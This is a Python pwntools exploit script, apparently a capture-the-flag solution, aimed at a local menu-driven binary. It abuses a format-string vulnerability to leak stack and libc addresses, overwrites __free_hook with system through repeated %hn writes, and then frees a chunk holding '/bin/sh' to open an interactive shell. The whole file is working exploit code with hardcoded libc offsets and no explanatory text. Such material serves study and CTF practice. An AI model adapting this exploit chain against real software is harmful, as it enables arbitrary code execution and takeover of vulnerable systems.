from pwn import *
elf = ELF('./test')

p = elf.process()
gdb.attach(p)
gdb.attach(p, """
b *show+224
b delete""")
pause()
leak_payload = b'%10$p|%13$p'

# function to write value3 to value4
def write_(p, value4, value3, param1, param2):
	# setup
	write_addr = value3
	write_addr_offset = write_addr & 0xffff

	lo, hi, ext = (value4 & 0xffff), ((value4>>16) & 0xffff), (value4 >> 32)
	write_arr = {lo:write_addr_offset, hi:(write_addr_offset+2), ext:(write_addr_offset + 4)}
	print (write_arr)
	# write_addr
	for i in write_arr:
		## write addr offset to param2 using param1
		payload  = b'%' + str(write_arr[i]).encode()
		payload += b'c%' + str(param1).encode() + b'$hn'

		p.sendlineafter(b'> ', b'M')
		p.sendlineafter(b'> ', b'10')
		p.sendlineafter(b'> ', payload)
		p.sendlineafter(b'> ', b'S')
		p.sendlineafter(b'> ', b'10')
		## use param2 to modify value
		payload = b'%' + str(i).encode()
		payload += b'c%' + str(param2).encode() + b'$hn'

		p.sendlineafter(b'> ', b'M')
		p.sendlineafter(b'> ', b'10')
		p.sendlineafter(b'> ', payload)
		p.sendlineafter(b'> ', b'S')
		p.sendlineafter(b'> ', b'10')


# create block size 100
p.sendlineafter(b'> ', b'C')
p.sendlineafter(b'> ', b'0')
p.sendlineafter(b'> ', b'100')
p.sendlineafter(b'> ', leak_payload)

# trigger bug, leak stack, libc
p.sendlineafter(b'> ', b'S')
p.sendlineafter(b'> ', b'0')
p.recvuntil(b': ')
raw = p.recvline().replace(b'\n', b"").split(b'|')
print (raw)
leak = int(raw[1], 16)

stack_base = int(raw[0], 16) - 13*8
libc_base = leak - 0x24083
system = libc_base + 0x52290
__free_hook = libc_base + 0x1eee48

print (stack_base)

p.sendlineafter(b'> ', b'C')
p.sendlineafter(b'> ', b'10')
p.sendlineafter(b'> ', b'200')
p.sendlineafter(b'> ', b'AABB')


write_(p, __free_hook,  stack_base + 22*8, 15, 43)
write_(p, __free_hook+2,  stack_base + 23*8, 15, 43)
write_(p, __free_hook+4,  stack_base + 24*8, 15, 43)
p.sendlineafter(b'> ', b'M')
p.sendlineafter(b'> ', b'10')
p.sendlineafter(b'> ', b'%'+str(system & 0xffff).encode() +b'c%21$hn')
p.sendlineafter(b'> ', b'S')
#pause()
p.sendlineafter(b'> ', b'10')

p.sendlineafter(b'> ', b'M')
p.sendlineafter(b'> ', b'10')
p.sendlineafter(b'> ', b'%'+str((system >> 16) & 0xffff).encode() +b'c%22$hn')
p.sendlineafter(b'> ', b'S')
#pause()
p.sendlineafter(b'> ', b'10')

p.sendlineafter(b'> ', b'M')
p.sendlineafter(b'> ', b'10')
p.sendlineafter(b'> ', b'%'+str(system >> 32).encode() +b'c%23$hn')
p.sendlineafter(b'> ', b'S')
pause()
p.sendlineafter(b'> ', b'10')

p.sendlineafter(b'> ', b'M')
p.sendlineafter(b'> ', b'10')
p.sendlineafter(b'> ', b'/bin/sh\x00')
p.sendlineafter(b'> ', b'D')
p.sendlineafter(b'> ', b'10')


p.interactive()
